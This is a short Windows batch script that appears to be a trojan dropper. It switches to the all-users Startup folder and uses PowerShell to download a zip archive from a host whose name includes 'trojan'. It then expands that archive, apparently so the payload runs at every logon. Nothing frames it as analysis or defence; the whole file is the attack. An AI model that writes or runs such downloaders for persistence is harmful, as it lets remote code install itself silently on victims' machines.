@echo off

cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

powershell -Command "Invoke-WebRequest https://downloads-for-trojan-by-varun-banka.netlify.app/my_zip_file.zip -OutFile my_zip_file.zip"

powershell -command "Expand-Archive -Force '%~dp0my_zip_file.zip' '%~dp0'"


